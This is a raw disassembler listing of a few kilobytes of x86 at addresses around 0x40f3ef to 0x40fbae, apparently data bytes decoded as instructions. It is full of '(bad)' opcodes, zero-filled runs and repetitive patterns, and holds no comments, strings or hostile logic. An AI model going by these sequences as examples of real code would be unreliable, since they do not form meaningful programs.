  40f3ef:	dec    ebp
  40f3f1:	mov    ah,0xb5
  40f3f3:	(bad)  
  40f3f4:	fcmovb st,st(7)
  40f3f6:	(bad)  
  40f3f7:	jmp    edi
  40f3f9:	(bad)  
  40f3fb:	(bad)  
  40f3fc:	out    dx,eax
  40f3fd:	jmp    0xfff7:0xf7f5ffea
  40f404:	repnz repz repz (bad) 
  40f408:	out    dx,eax
  40f409:	icebp  
  40f40a:	icebp  
  40f40b:	(bad)  
  40f40c:	in     al,dx
  40f40d:	out    dx,al
  40f40e:	out    dx,al
  40f40f:	(bad)  
  40f410:	jmp    0xe8e7:0xe5ffedec
  40f417:	jmp    ecx
  40f419:	in     al,0xe6
  40f41b:	(bad)  
  40f41c:	fsubrp st(1),st
  40f41e:	in     eax,0xff
  40f420:	fcmovnu st,st(7)
  40f422:	in     eax,0xff
  40f424:	xlat   BYTE PTR ds:[ebx]
  40f425:	fucom  st(6)
  40f427:	call   esi
  40f429:	fcomp  st(2)
  40f42b:	(bad)  
  40f42c:	fmul   st(7),st
  40f42e:	mov    ebx,0xbbc3c7ff
  40f433:	(bad)  
  40f434:	mov    al,0xb4
  40f436:	mov    ch,0xf8
  40f438:	xchg   ecx,eax
  40f439:	xchg   ebx,eax
  40f43a:	xchg   ebx,eax
  40f43b:	jmp    0x8b934691
  40f440:	add    BYTE PTR [eax],al
  40f442:	add    BYTE PTR ds:0x4000000,bl
	...
  40f458:	add    BYTE PTR [eax],al
  40f45a:	add    BYTE PTR [ecx],al
  40f45c:	jnp    0x40f4d9
  40f45e:	jnp    0x40f4c6
  40f460:	fstp   st(5)
  40f462:	(bad)  
  40f464:	loope  0x40f447
  40f466:	loope  0x40f467
  40f468:	aam    0xd6
  40f46a:	fdivr  st,st(7)
  40f46c:	mov    eax,ds:0x9bff7b76
  40f471:	jmp    DWORD PTR fs:[si+0x7171]
  40f477:	jmp    FWORD PTR [ebx-0x4f008687]
  40f47d:	jg     0x40f4fe
  40f47f:	(bad)  
  40f480:	mov    eax,0xc5ff8c8c
  40f485:	mov    ds:0xb5d1ffa2,al
  40f48a:	mov    ch,0xff
  40f48c:	fld    st(7)
  40f48e:	(bad)  
  40f48f:	jmp    eax
  40f491:	aam    0xd4
  40f493:	jmp    edx
  40f495:	fcmovnu st,st(3)
  40f497:	jmp    edx
  40f499:	fstp   st(5)
  40f49b:	jmp    ecx
  40f49d:	loope  0x40f480
  40f49f:	(bad)  
  40f4a0:	(bad)  
  40f4a2:	(bad)  
  40f4a4:	fcmovu st,st(2)
  40f4a6:	(bad)  
  40f4a8:	xlat   BYTE PTR ds:[ebx]
  40f4a9:	fcomp  st(1)
  40f4ab:	call   esp
  40f4ad:	(bad)  
  40f4ae:	(bad)  
  40f4b0:	(bad)  
  40f4b2:	(bad)  
  40f4b4:	ret    0xc2c2
  40f4b7:	jmp    FWORD PTR [esi+0x6e]
  40f4ba:	outs   dx,BYTE PTR ds:[esi]
  40f4bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4bc:	cs cs cs daa 
  40f4c0:	add    BYTE PTR [eax],al
  40f4c2:	add    BYTE PTR [esi],al
  40f4c4:	add    BYTE PTR [eax],al
  40f4c6:	add    BYTE PTR [ecx],al
	...
  40f4d8:	add    BYTE PTR [eax],al
  40f4da:	add    BYTE PTR [edi+eax*4],al
  40f4dd:	xchg   DWORD PTR [edi-0x21212067],eax
  40f4e3:	jmp    eax
  40f4e5:	jecxz  0x40f4cd
  40f4e7:	(bad)  
  40f4e8:	(bad)  
  40f4ea:	mov    esp,0x6986c0ff
  40f4ef:	push   DWORD PTR [esi-0x52008d7f]
  40f4f5:	jp     0x40f56d
  40f4f7:	jmp    FWORD PTR [ebx-0x52008788]
  40f4fd:	jp     0x40f57a
  40f4ff:	push   DWORD PTR [eax-0x4e008284]
  40f505:	jge    0x40f585
  40f507:	push   DWORD PTR [ebx-0x49008082]
  40f50d:	add    DWORD PTR [edx-0x7a7b4401],0x9493c3ff
  40f517:	dec    edx
  40f519:	lahf   
  40f51a:	lahf   
  40f51b:	(bad)  
  40f51c:	(bad)  
  40f51e:	fcos   
  40f520:	jmp    0xefef:0xedffecec
  40f527:	(bad)  
  40f528:	jmp    0xe840e017
  40f52d:	out    0xe6,al
  40f52f:	jmp    FWORD PTR [ebx+0x31f8abab]
  40f535:	xor    DWORD PTR [ecx],esi
  40f537:	lods   eax,DWORD PTR ds:[esi]
  40f538:	add    BYTE PTR [eax],al
  40f53a:	add    BYTE PTR [eax],bh
  40f53c:	add    BYTE PTR [eax],al
  40f53e:	add    BYTE PTR [edi],al
  40f540:	(bad)  
  40f541:	(bad)  
  40f542:	inc    DWORD PTR [eax]
	...
  40f558:	sub    BYTE PTR [eax],ch
  40f55a:	sub    BYTE PTR ds:0xebb9b9b9,dl
  40f560:	out    dx,al
  40f561:	out    dx,eax
  40f562:	out    dx,eax
  40f563:	(bad)  
  40f564:	jmp    0xf740e655
  40f569:	retf   0xff93
  40f56c:	(bad)  
  40f56d:	mov    ecx,0xc3fdff62
  40f572:	cmp    edi,0xff95c8fb
  40f578:	test   bl,0x98
  40f57b:	(bad)  
  40f57c:	in     al,dx
  40f57d:	mov    ecx,0xb0e3ff98
  40f582:	xchg   edi,eax
  40f583:	(bad)  
  40f584:	fld    TBYTE PTR [eax-0x602e0069]
  40f58a:	xchg   esp,eax
  40f58b:	dec    esi
  40f58d:	fwait
  40f58e:	xchg   ebp,eax
  40f58f:	dec    esp
  40f591:	cdq    
  40f592:	xchg   ebp,eax
  40f593:	dec    ebx
  40f595:	xchg   edi,eax
  40f596:	xchg   ebp,eax
  40f597:	dec    edx
  40f599:	xchg   edi,eax
  40f59a:	xchg   esi,eax
  40f59b:	(bad)  
  40f59c:	call   0xfb40d580
  40f5a1:	div    dh
  40f5a3:	(bad)  
  40f5a4:	push   esi
  40f5a6:	idiv   bh
  40f5a8:	(bad)  
  40f5a9:	out    dx,al
  40f5aa:	out    dx,al
  40f5ab:	(bad)  
  40f5ac:	(bad)  
  40f5ad:	out    dx,al
  40f5ae:	out    dx,al
  40f5af:	push   DWORD PTR [ebp+0x3faacac]
  40f5b5:	add    eax,DWORD PTR [ebx]
  40f5b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5b8:	add    BYTE PTR [eax],al
  40f5ba:	add    BYTE PTR [ebp+0x0],dl
  40f5bd:	add    BYTE PTR [eax],al
  40f5bf:	adc    al,BYTE PTR [eax]
	...
  40f5d5:	add    BYTE PTR [eax],al
  40f5d7:	add    BYTE PTR [ecx-0x159b7e7f],al
  40f5dd:	jmp    0x40f5cb
  40f5df:	std    
  40f5e0:	cmc    
  40f5e1:	stc    
  40f5e2:	(bad)  
  40f5e3:	push   ebp
  40f5e5:	out    dx,eax
  40f5e6:	call   0x7c04f3ea
  40f5eb:	(bad)  
  40f5ec:	inc    ebx
  40f5ee:	jle    0x40f5ef
  40f5f0:	dec    esp
  40f5f2:	xchg   edi,eax
  40f5f3:	(bad)  
  40f5f4:	dec    esp
  40f5f6:	pushf  
  40f5f7:	(bad)  
  40f5f8:	dec    ebp
  40f5fa:	lahf   
  40f5fb:	(bad)  
  40f5fc:	dec    esi
  40f5fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5ff:	(bad)  
  40f600:	dec    edi
  40f602:	test   eax,0xadcfffff
  40f607:	(bad)  
  40f608:	call   ecx
  40f60a:	mov    cl,0xff
  40f60c:	dec    edi
  40f60e:	mov    ch,0xff
  40f610:	std    
  40f611:	retf   0xffb6
  40f614:	clc    
  40f615:	lds    esi,FWORD PTR [edi-0x483e0c01]
  40f61b:	push   ecx
  40f61d:	ror    dh,1
  40f61f:	(bad)  
  40f620:	(bad)  
  40f621:	fcmovnu st,st(3)
  40f623:	(bad)  
  40f624:	(bad)  
  40f625:	(bad)  
  40f627:	(bad)  
  40f628:	jmp    esp
  40f62a:	in     al,0xff
  40f62c:	push   eax
  40f62e:	lock (bad) 
  40f630:	out    dx,eax
  40f631:	call   0x4c8cf61e
  40f636:	dec    esp
  40f637:	rol    DWORD PTR [eax],cl
  40f639:	add    BYTE PTR [eax],al
  40f63b:	jl     0x40f63d
  40f63d:	add    BYTE PTR [eax],al
  40f63f:	add    BYTE PTR es:[eax],al
  40f642:	add    BYTE PTR [ebx],al
	...
  40f658:	mov    bl,0xb3
  40f65a:	mov    ah,0xb7
  40f65c:	repz out dx,eax
  40f65e:	jmp    0x40f65f
  40f660:	(bad)  
  40f661:	fidiv  WORD PTR [esi-0x72340101]
  40f667:	(bad)  
  40f668:	inc    ebx
  40f66a:	jle    0x40f66b
  40f66c:	dec    ebx
  40f66e:	xchg   edi,eax
  40f66f:	(bad)  
  40f670:	dec    esp
  40f672:	pushf  
  40f673:	(bad)  
  40f674:	dec    esp
  40f676:	lahf   
  40f677:	(bad)  
  40f678:	dec    esp
  40f67a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f67b:	(bad)  
  40f67c:	dec    esp
  40f67e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f67f:	(bad)  
  40f680:	dec    esp
  40f682:	stos   DWORD PTR es:[edi],eax
  40f683:	(bad)  
  40f684:	dec    esp
  40f686:	scas   eax,DWORD PTR es:[edi]
  40f687:	(bad)  
  40f688:	dec    esp
  40f68a:	mov    bl,0xff
  40f68c:	dec    esp
  40f68e:	mov    bh,0xff
  40f690:	dec    ebp
  40f692:	mov    esp,0xc1cdffff
  40f697:	(bad)  
  40f698:	sti    
  40f699:	retf   0xffc1
  40f69c:	mov    ah,0xa2
  40f69e:	mov    eax,ds:0xdadafbfc
  40f6a3:	(bad)  
  40f6a4:	(bad)  
  40f6a5:	call   0xf040f692
  40f6aa:	out    dx,eax
  40f6ab:	(bad)  
  40f6ac:	(bad)  
  40f6ad:	stc    
  40f6ae:	stc    
  40f6af:	(bad)  
  40f6b0:	(bad)  
  40f6b1:	(bad)  
  40f6b2:	(bad)  
  40f6b3:	call   DWORD PTR [edi+0x5ed9797]
  40f6b9:	add    eax,0x9105
  40f6be:	add    BYTE PTR [ebx],bh
  40f6c0:	add    BYTE PTR [eax],al
  40f6c2:	add    BYTE PTR [ecx],cl
	...
  40f6d8:	sahf   
  40f6d9:	lahf   
  40f6da:	mov    eax,ds:0x919fab8b
  40f6df:	(bad)  
  40f6e0:	(bad)  
  40f6e1:	mov    bh,0x5e
  40f6e3:	(bad)  
  40f6e4:	inc    dl
  40f6e6:	jle    0x40f6e7
  40f6e8:	dec    bl
  40f6ea:	xchg   esi,eax
  40f6eb:	(bad)  
  40f6ec:	dec    ah
  40f6ee:	pushf  
  40f6ef:	(bad)  
  40f6f0:	dec    esp
  40f6f2:	lahf   
  40f6f3:	(bad)  
  40f6f4:	dec    esi
  40f6f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6f7:	(bad)  
  40f6f8:	dec    esi
  40f6fa:	test   al,0xff
  40f6fc:	dec    esi
  40f6fe:	lods   al,BYTE PTR ds:[esi]
  40f6ff:	(bad)  
  40f700:	dec    esi
  40f702:	mov    al,0xff
  40f704:	dec    esi
  40f706:	mov    ah,0xff
  40f708:	dec    esi
  40f70a:	mov    eax,0xbccdffff
  40f70f:	(bad)  
  40f710:	dec    ebp
  40f712:	sar    bh,0xff
  40f715:	int    0xc5
  40f717:	push   eax
  40f719:	(bad)  
  40f71a:	sar    dh,0x5c
  40f71d:	pop    ebp
  40f71e:	pop    ebp
  40f71f:	ret    0xc2ce
  40f722:	ret    0xffeb
  40f725:	cmc    
  40f726:	cmc    
  40f727:	(bad)  
  40f728:	(bad)  
  40f729:	std    
  40f72a:	std    
  40f72b:	(bad)  
  40f72c:	(bad)  
  40f72d:	(bad)  
  40f72e:	(bad)  
  40f72f:	(bad)  
  40f730:	(bad)  
  40f731:	(bad)  
  40f732:	(bad)  
  40f733:	(bad)  
  40f734:	fstp   st(5)
  40f736:	(bad)  
  40f738:	inc    esi
  40f739:	inc    esi
  40f73a:	inc    esi
  40f73b:	mov    es,WORD PTR [eax]
  40f73d:	add    BYTE PTR [eax],al
  40f73f:	das    
  40f740:	add    BYTE PTR [eax],al
  40f742:	add    BYTE PTR [ecx],cl
	...
  40f758:	(bad)  
  40f759:	(bad)  
  40f75a:	inc    DWORD PTR [eax]
  40f75c:	nop
  40f75d:	nop
  40f75e:	nop
  40f75f:	cmp    eax,0x788f9192
  40f764:	xchg   esi,eax
  40f765:	xchg   ebx,eax
  40f766:	(bad)  
  40f767:	(bad)  
  40f768:	lods   al,BYTE PTR ds:[esi]
  40f769:	lahf   
  40f76a:	xchg   edx,eax
  40f76b:	stos   BYTE PTR es:[edi],al
  40f76c:	mov    eax,0xbfbc93a5
  40f771:	test   eax,0xabc2c996
  40f776:	fwait
  40f777:	ror    ebx,cl
  40f779:	mov    al,0x9e
  40f77b:	loope  0x40f758
  40f77d:	mov    eax,0xbde0eba5
  40f782:	stos   BYTE PTR es:[edi],al
  40f783:	clc    
  40f784:	jmp    0xb4c2:0xebffb1c1
  40f78b:	push   eax
  40f78d:	lds    edi,FWORD PTR [edx-0x3d350501]
  40f793:	(bad)  
  40f794:	dec    esi
  40f796:	leave  
  40f797:	(bad)  
  40f798:	fidivr DWORD PTR [ecx+0x606fdb8]
  40f79e:	push   es
  40f79f:	dec    edi
  40f7a0:	xchg   ebp,eax
  40f7a1:	xchg   esp,eax
  40f7a2:	xchg   esp,eax
  40f7a3:	fwait
  40f7a4:	out    dx,eax
  40f7a5:	jmp    0x40f792
  40f7a7:	(bad)  
  40f7a8:	jmp    0xd440e196
  40f7ad:	aam    0xd4
  40f7af:	jmp    0xd5fdb470
  40f7b4:	lods   eax,DWORD PTR ds:[esi]
  40f7b5:	lods   eax,DWORD PTR ds:[esi]
  40f7b6:	lods   eax,DWORD PTR ds:[esi]
  40f7b7:	mov    ebx,0x58777777
  40f7bc:	add    BYTE PTR [eax],al
  40f7be:	add    BYTE PTR ds:0x2000000,cl
	...
  40f7d8:	(bad)  
  40f7d9:	(bad)  
  40f7da:	inc    DWORD PTR [eax]
  40f7dc:	(bad)  
  40f7dd:	(bad)  
  40f7de:	inc    DWORD PTR [eax]
  40f7e0:	(bad)  
  40f7e1:	(bad)  
  40f7e2:	inc    DWORD PTR [eax]
  40f7e4:	(bad)  
  40f7e5:	(bad)  
  40f7e6:	inc    DWORD PTR [eax]
  40f7e8:	add    BYTE PTR [eax],al
  40f7ea:	add    BYTE PTR [ecx],al
  40f7ec:	add    BYTE PTR [eax],al
  40f7ee:	add    BYTE PTR [ecx],al
  40f7f0:	add    BYTE PTR [eax],al
  40f7f2:	add    BYTE PTR [ecx],al
  40f7f4:	add    BYTE PTR [ebx-0x7678f67a],0x8b
  40f7fb:	sbb    al,BYTE PTR [ebx-0x78da7578]
  40f801:	xchg   DWORD PTR [eax-0x6f6b5ec7],ecx
  40f807:	inc    esp
  40f808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f809:	cdq    
  40f80a:	xchg   ebp,eax
  40f80b:	pop    eax
  40f80c:	scas   al,BYTE PTR es:[edi]
  40f80d:	sahf   
  40f80e:	call   0xa885:0x98989f65
  40f815:	fwait
  40f816:	fwait
  40f817:	fwait
  40f818:	call   0x0:0x8f9393
  40f81f:	adc    dh,BYTE PTR [ebx+0x73]
  40f822:	jae    0x40f83e
  40f824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f827:	pop    edx
  40f828:	popf   
  40f829:	popf   
  40f82a:	popf   
  40f82b:	inc    esp
  40f82c:	outs   dx,DWORD PTR ds:[esi]
  40f82d:	outs   dx,DWORD PTR ds:[esi]
  40f82e:	outs   dx,DWORD PTR ds:[esi]
  40f82f:	daa    
  40f830:	dec    ebp
  40f831:	dec    ebp
  40f832:	dec    ebp
  40f833:	or     al,0x0
  40f835:	add    BYTE PTR [eax],al
  40f837:	add    al,BYTE PTR [eax]
  40f839:	add    BYTE PTR [eax],al
  40f83b:	add    edi,edi
  40f83d:	(bad)  
  40f83e:	inc    DWORD PTR [eax]
	...
  40f858:	loopne 0x40f85a
  40f85a:	add    BYTE PTR [edi],bl
  40f85c:	add    BYTE PTR [eax],0x0
  40f85f:	pop    es
  40f860:	add    BYTE PTR [eax],0x0
  40f863:	add    eax,DWORD PTR [eax-0x7fff0000]
  40f869:	add    BYTE PTR [eax],al
  40f86b:	add    DWORD PTR [eax-0x80000000],eax
  40f871:	add    BYTE PTR [eax],al
  40f873:	add    BYTE PTR [eax-0x80000000],al
  40f879:	add    BYTE PTR [eax],al
  40f87b:	add    BYTE PTR [eax-0x80000000],al
  40f881:	add    BYTE PTR [eax],al
  40f883:	add    BYTE PTR [eax-0x80000000],al
  40f889:	add    BYTE PTR [eax],al
  40f88b:	add    BYTE PTR [eax-0x80000000],al
  40f891:	add    BYTE PTR [eax],al
  40f893:	add    BYTE PTR [eax-0x80000000],al
  40f899:	add    BYTE PTR [eax],al
  40f89b:	add    BYTE PTR [eax-0x80000000],al
  40f8a1:	add    BYTE PTR [eax],al
  40f8a3:	add    DWORD PTR [eax-0x7fff0000],eax
  40f8a9:	add    BYTE PTR [eax],al
  40f8ab:	add    eax,DWORD PTR [eax-0x7ff10000]
  40f8b1:	add    BYTE PTR [eax],al
  40f8b3:	jo     0x4ff8b9
  40f8b9:	add    BYTE PTR [eax],al
  40f8bb:	sldt   WORD PTR [eax]
  40f8be:	add    BYTE PTR [edi],bh
  40f8c0:	add    BYTE PTR [eax],al
  40f8c2:	add    BYTE PTR [edi],bh
  40f8c4:	add    BYTE PTR [eax],al
  40f8c6:	add    BYTE PTR [edi],bl
  40f8c8:	add    BYTE PTR [eax],al
  40f8ca:	add    BYTE PTR [edi],bl
  40f8cc:	add    BYTE PTR [eax],al
  40f8ce:	add    BYTE PTR [edi],bl
  40f8d0:	add    BYTE PTR [eax],0x0
  40f8d3:	pop    ds
  40f8d4:	lock add BYTE PTR [eax],al
  40f8d7:	jg     0x40f901
  40f8d9:	add    BYTE PTR [eax],al
  40f8db:	add    BYTE PTR [eax],dl
  40f8dd:	add    BYTE PTR [eax],al
  40f8df:	add    BYTE PTR [eax],ah
  40f8e1:	add    BYTE PTR [eax],al
  40f8e3:	add    BYTE PTR [ecx],al
  40f8e5:	add    BYTE PTR [eax],ah
	...
  40f903:	add    DWORD PTR [eax],eax
  40f905:	add    BYTE PTR [eax],al
  40f907:	adc    BYTE PTR [eax],al
  40f909:	add    BYTE PTR [eax],al
  40f90b:	aas    
  40f90c:	add    BYTE PTR [eax],al
  40f90e:	add    BYTE PTR [ebp+0x0],ch
  40f911:	add    BYTE PTR [eax],al
  40f913:	jnp    0x40f915
  40f915:	add    BYTE PTR [eax],al
  40f917:	jo     0x40f919
  40f919:	add    BYTE PTR [eax],al
  40f91b:	pop    edi
  40f91c:	add    BYTE PTR [eax],al
  40f91e:	add    BYTE PTR [edi+0x0],cl
  40f921:	add    BYTE PTR [eax],al
  40f923:	dec    eax
  40f924:	add    BYTE PTR [eax],al
  40f926:	add    BYTE PTR [edi+0x0],dl
  40f929:	add    BYTE PTR [eax],al
  40f92b:	push   0x0
  40f92d:	add    BYTE PTR [eax],al
  40f92f:	ins    DWORD PTR es:[edi],dx
  40f930:	add    BYTE PTR [eax],al
  40f932:	add    BYTE PTR [esi+0x0],bl
  40f935:	add    BYTE PTR [eax],al
  40f937:	cmp    eax,DWORD PTR [eax]
  40f939:	add    BYTE PTR [eax],al
  40f93b:	push   ss
  40f93c:	add    BYTE PTR [eax],al
  40f93e:	add    BYTE PTR [edx*1+0x47051515],al
  40f945:	inc    edi
  40f946:	inc    edi
  40f947:	pop    edx
  40f948:	mov    DWORD PTR [ecx-0x58562377],ecx
  40f94e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f94f:	out    dx,eax
  40f950:	jg     0x40f9ce
  40f952:	jle    0x40f939
  40f954:	pop    ecx
  40f955:	pop    eax
  40f956:	pop    eax
  40f957:	xlat   BYTE PTR ds:[ebx]
  40f958:	xor    eax,0x24c53334
  40f95d:	pop    ds
  40f95e:	push   ds
  40f95f:	mov    dh,0x5c
  40f961:	ds aas 
  40f963:	enter  0x688c,0x68
  40f967:	ficom  WORD PTR [ebx+0x6de47373]
  40f96d:	push   esp
  40f96e:	push   esp
  40f96f:	fldcw  WORD PTR [edx]
  40f971:	sbb    al,0x1c
  40f973:	mov    ebx,0x8c000000
  40f978:	add    BYTE PTR [eax],al
  40f97a:	add    BYTE PTR [edi+0x0],cl
  40f97d:	add    BYTE PTR [eax],al
  40f97f:	push   ss
  40f980:	pop    eax
  40f981:	pop    eax
  40f982:	pop    eax
  40f983:	sbb    eax,0xf1a2a2a1
  40f988:	xlat   BYTE PTR ds:[ebx]
  40f989:	aad    0xd4
  40f98b:	(bad)  
  40f98c:	(bad)  
  40f98d:	std    
  40f98e:	bnd jmp edx
  40f991:	repnz (bad) 
  40f993:	(bad)  
  40f994:	stc    
  40f995:	repz loope 0x40f997
  40f998:	out    dx,al
  40f999:	rcr    DWORD PTR [ebp+0x7e86c6ff],0xfe
  40f9a0:	imul   DWORD PTR [ecx-0x39000055]
  40f9a6:	(bad)  
  40f9a7:	(bad)  
  40f9a8:	(bad)  
  40f9a9:	(bad)  
  40f9ab:	(bad)  
  40f9ac:	(bad)  
  40f9ad:	in     al,dx
  40f9ae:	in     al,dx
  40f9af:	call   esi
  40f9b1:	ret    
  40f9b2:	ret    
  40f9b3:	std    
  40f9b4:	inc    edx
  40f9b5:	sub    eax,0xd02d
  40f9ba:	add    BYTE PTR [ebp+0x3d000000],cl
  40f9c0:	arpl   WORD PTR [ebx+0x63],sp
  40f9c3:	and    ebp,DWORD PTR [edi-0x2b064f51]
  40f9c9:	iret   
  40f9ca:	iret   
  40f9cb:	push   eax
  40f9cd:	jmp    0x40f9a2
  40f9cf:	jmp    DWORD PTR [ecx]
  40f9d1:	lods   eax,DWORD PTR ds:[esi]
  40f9d2:	and    eax,0x21aa29ff
  40f9d7:	call   FWORD PTR [edx+ebx*4-0x6200009d]
  40f9de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9df:	(bad)  
  40f9e0:	jmp    DWORD PTR [eax-0x52000060]
  40f9e6:	lods   al,BYTE PTR ds:[esi]
  40f9e7:	(bad)  
  40f9e8:	(bad)  
  40f9e9:	mov    esi,0xeaffffbd
  40f9ee:	jmp    0xd5ff:0xffffffff
  40f9f5:	ret    
  40f9f6:	ret    
  40f9f7:	std    
  40f9f8:	sbb    DWORD PTR es:[ecx],ebx
  40f9fb:	mov    ebx,0x68000000
  40fa00:	gs gs and bh,BYTE PTR gs:[ebp-0x17094243]
  40fa09:	loop   0x40f9ec
  40fa0b:	push   ecx
  40fa0d:	in     eax,0xc9
  40fa0f:	push   DWORD PTR [ecx]
  40fa11:	ret    
  40fa12:	inc    edx
  40fa13:	inc    DWORD PTR [eax]
  40fa15:	mov    al,ds:0x9d9fff07
  40fa1a:	je     0x40fa1b
  40fa1c:	push   DWORD PTR [edi-0x5e000043]
  40fa22:	mov    al,ds:0xbab1ffff
  40fa27:	(bad)  
  40fa28:	cld    
  40fa29:	mov    ebx,0xf3ffffd0
  40fa2e:	idiv   edi
  40fa30:	(bad)  
  40fa31:	(bad)  
  40fa32:	(bad)  
  40fa33:	(bad)  
  40fa34:	(bad)  
  40fa35:	(bad)  
  40fa36:	(bad)  
  40fa37:	(bad)  
  40fa38:	jp     0x40fa9a
  40fa3a:	pusha  
  40fa3b:	jecxz  0x40fa3d
  40fa3d:	add    BYTE PTR [eax],al
  40fa3f:	xchg   DWORD PTR [eax+0x68],ebp
  40fa42:	push   0xc3c2c222
  40fa47:	imul   ah
  40fa49:	in     al,0xe2
  40fa4b:	push   ebx
  40fa4d:	loope  0x40fa0d
  40fa4f:	call   DWORD PTR [ebx-0x1a]
  40fa52:	imul   edi,edi,0x1e
  40fa55:	mov    cl,0x2c
  40fa57:	dec    eax
  40fa59:	lods   eax,DWORD PTR ds:[esi]
  40fa5a:	popf   
  40fa5b:	(bad)  
  40fa5c:	dec    ecx
  40fa5e:	int3   
  40fa5f:	(bad)  
  40fa60:	dec    ecx
  40fa62:	retf   0xe6ff
  40fa65:	(bad)  
  40fa66:	sar    edi,1
  40fa68:	(bad)  
  40fa69:	mov    al,0xaf
  40fa6b:	push   ecx
  40fa6d:	loopne 0x40fa53
  40fa6f:	(bad)  
  40fa70:	clc    
  40fa71:	cmc    
  40fa72:	hlt    
  40fa73:	(bad)  
  40fa74:	clc    
  40fa75:	hlt    
  40fa76:	repnz inc eax
  40fa79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa7b:	sti    
  40fa7c:	add    BYTE PTR [eax],al
  40fa7e:	add    BYTE PTR [esi+0x226b6b6c],cl
  40fa84:	(bad)
  40fa87:	imul   dh
  40fa89:	jmp    0xffb3:0xdcf3ffea
  40fa90:	pop    ebp
  40fa91:	loopne 0x40fa48
  40fa93:	push   DWORD PTR [esi]
  40fa95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa96:	retf   0xc6ff
  40fa99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa9a:	mov    eax,0xcdcfffff
  40fa9f:	(bad)  
  40faa0:	(bad)  
  40faa1:	fstp   st(6)
  40faa3:	jmp    esp
  40faa5:	aad    0xdf
  40faa7:	(bad)  
  40faa8:	mov    edx,0xedff9aa3
  40faad:	retf   
  40faae:	int3   
  40faaf:	(bad)  
  40fab0:	sti    
  40fab1:	retf   
  40fab2:	retf   
  40fab3:	(bad)  
  40fab4:	cli    
  40fab5:	retf   
  40fab6:	retf   0xceff
  40fab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fabb:	cld    
  40fabc:	add    BYTE PTR [eax],al
  40fabe:	add    BYTE PTR [ebx+0x226f6e6d],al
  40fac4:	retf   
  40fac5:	lds    edi,FWORD PTR [edx-0x4c25090a]
  40facb:	push   ebp
  40facd:	shr    BYTE PTR [edi-0xa529e01],cl
  40fad3:	(bad)  
  40fad4:	cmp    dl,BYTE PTR [esi-0x5e580005]
  40fada:	ret    
  40fadb:	(bad)  
  40fadc:	push   ebp
  40fade:	repnz (bad) 
  40fae0:	(bad)  
  40fae1:	sti    
  40fae2:	sti    
  40fae3:	(bad)  
  40fae4:	push   ebx
  40fae6:	(bad)  
  40fae7:	push   edx
  40fae9:	mov    esi,0xc1fdffdc
  40faee:	retf   
  40faef:	(bad)  
  40faf0:	call   FWORD PTR [edi-0x4c000062]
  40faf6:	mov    bl,0xff
  40faf8:	ror    BYTE PTR [eax+0xf788],0x0
  40faff:	pop    edi
  40fb00:	jno    0x40fb78
  40fb02:	jge    0x40fb26
  40fb04:	iret   
  40fb05:	mov    ds:0xabf2f666,eax
  40fb0a:	push   ecx
  40fb0b:	(bad)  
  40fb0c:	call   edx
  40fb0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb0f:	push   esi
  40fb11:	leave  
  40fb12:	fwait
  40fb13:	(bad)  
  40fb14:	ffree  st(2)
  40fb16:	mov    ds:0x9ea6cbff,eax
  40fb1b:	(bad)  
  40fb1c:	in     eax,dx
  40fb1d:	jmp    0x40fb10
  40fb22:	(bad)  
  40fb23:	(bad)  
  40fb24:	push   eax
  40fb26:	lock (bad) 
  40fb28:	dec    ebx
  40fb2a:	sar    bh,cl
  40fb2c:	push   DWORD PTR [ebx-0x5c00004c]
  40fb32:	mov    ds:0x9f9ffcff,al
  40fb37:	(bad)  
  40fb38:	jnp    0x40fb8c
  40fb3a:	push   edx
  40fb3b:	mov    edi,0x2e000000
  40fb40:	jne    0x40fbbb
  40fb42:	jge    0x40fb66
  40fb44:	lds    esp,FWORD PTR [edi-0x481c097c]
  40fb4a:	mov    bh,bh
  40fb4c:	inc    edx
  40fb4e:	jbe    0x40fb4f
  40fb50:	(bad)  
  40fb51:	mov    ecx,0xc0ffff5e
  40fb56:	push   0x68b6fcff
  40fb5b:	call   edx
  40fb5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb5e:	xchg   edi,edi
  40fb60:	jmp    0x40fb46
  40fb62:	jmp    0xffff:0xf6f2ffff
  40fb69:	fcmovnu st,st(5)
  40fb6b:	(bad)  
  40fb6c:	dec    esi
  40fb6e:	into   
  40fb6f:	(bad)  
  40fb70:	cld    
  40fb71:	mov    dh,0xb6
  40fb73:	jmp    FWORD PTR [esi+0x30e27070]
  40fb79:	and    BYTE PTR [eax],ah
  40fb7b:	inc    esp
  40fb7c:	add    BYTE PTR [eax],al
  40fb7e:	add    BYTE PTR [edi+esi*2],cl
  40fb81:	ja     0x40fbfa
  40fb83:	and    edi,DWORD PTR [ecx-0x27094144]
  40fb89:	rol    esi,1
  40fb8b:	(bad)  
  40fb8c:	inc    edi
  40fb8e:	jno    0x40fb8f
  40fb90:	sti    
  40fb91:	retf   
  40fb92:	cmp    bh,0xfa
  40fb95:	les    edi,FWORD PTR [eax-0x1]
  40fb98:	cld    
  40fb99:	mov    edi,0xb0f7ff68
  40fb9e:	push   eax
  40fb9f:	call   ebp
  40fba1:	cdq    
  40fba2:	pop    ebp
  40fba3:	jmp    edx
  40fba5:	mov    dh,0x98
  40fba7:	jmp    edi
  40fba9:	mov    esi,0x92baffac
  40fbae:	xchg   edx,eax
